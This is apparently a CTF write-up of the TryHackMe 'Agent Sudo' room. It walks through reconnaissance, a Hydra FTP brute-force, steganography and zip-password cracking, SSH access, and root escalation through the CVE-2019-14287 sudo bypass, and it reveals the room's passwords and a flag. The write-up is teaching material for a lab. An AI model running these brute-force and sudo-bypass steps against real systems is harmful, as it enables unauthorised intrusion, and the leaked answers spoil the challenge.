# **Agent Sudo— TryHackMe — CTF Writeup**

# Jun 3, 2025

![][image1]

Hello everyone\! This is a beginner-friendly room from the TryHackMe platform titled “Agent Sudo.”

This room is classified as easy and is a walkthrough-type challenge. I hope this write-up helps guide you through the process\!

My goal is to help you understand each step and provide clear explanations so that anyone, whether a beginner or experienced, can follow along and understand the reasoning behind each action. I hope this write-up makes the process smoother and easier to grasp.

Enough talk — let’s dive right in, and I hope you enjoy the journey\! :)

![][image2]

We start with the nmap scan:

![][image3]

***nmap 10.10.132.168 — open***

The Open ports:

* 21 (FTP)  
* 22 (SSH)  
* 80 (HTTP)

Webpage loads but isn’t helpful up front — mentions **codenames** and agent themes.

![][image4]

![][image5]

Let’s scan with feroxbuster:

***feroxbuster \-u http://10.10.132.168 \-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt***

Nothing useful, so let’s try header injection on the homepage using BurpSuite

Capture the request to / and add a header in the **User-Agent** field using Burp Repeater:

![][image6]

![][image7]

![][image8]

![][image9]

User-Agent: C

**Message received:**

**![][image10]**

Agent name: **Chris**  
Weak password warning

![][image11]

Next we try FTP using this :

Try anonymous login first → fails.

Use **Hydra** to brute-force FTP creds for user **chris:**

**![][image12]**

***hydra \-l chris \-P /usr/share/wordlists/rockyou.txt ftp://10.10.132.168***

Cracked:

* **Username**: chris  
* **Password**: crystal

Now let’s log in:

***ftp 10.10.132.168***

Get these files:

![][image13]

* To\_agentJ.txt  
* cutie.png  
* cute-alien.jpg

Now we analyze the content of the files:

![][image14]

***cat To\_agentJ.txt***

{Gives a hint that *Agent J* (james) has sensitive data}

I even check the steganography on the jpg:

***steghide — info cute-alien.jpg***

***![][image15]***

It’s password-protected. Use stegseek with rockyou.txt

***stegseek cute-alien.jpg /usr/share/wordlists/rockyou.txt***

**Passphrase: Area51**

**Output file: cute-alien.jpg.out**

***cat cute-alien.jpg.out***

Found credentials:

![][image16]

***Username: james***

***Password: hackerrules\!***

Now to analyze cutie.png , we run binwalk:

![][image17]

***binwalk \-e cutie.png — run-as=root***  
***cd \_cutie.png.extracted/***

We find a **zip file** (8702.zip). Crack it:

![][image18]

***7z e 8702.zip***

Since it is Password protected → we crack using john

![][image19]

***zip2john 8702.zip \> hash***  
***john hash — wordlist=/usr/share/wordlists/rockyou.txt***

**Password: alien**

Now accessing James through SSH :

***ssh james@10.10.132.168***

***![][image20]***

**Use password: hackerrules\!**

Get user flag:

![][image21]

***cat user.txt***

Next we analyze the image :

![][image22]

***scp james@10.10.132.168:Alien\_autopsy.jpg \~/Downloads/***

Search the image online — identifies as the **Roswell alien autopsy** photo, hinting at cover-up themes and classic alien conspiracy.

Now privilege Escalation :

Check sudo permissions:

***sudo \-l***

Output:

**(ALL, \!root) /bin/bash**

This is vulnerable to **CVE-2019–14287** — user can bypass root restriction using \-u\#-1

***sudo \-u\#-1 /bin/bash \-i***

***![][image23]***

Boom\!

***cd /root***  
***cat root.txt***

***![][image24]***

Agent name: Deskel

Flags:

![][image25]

![][image26]

![][image27]

B03d975e8c92a7c04146cfa7a5a313c7

Roswell alien autopsy
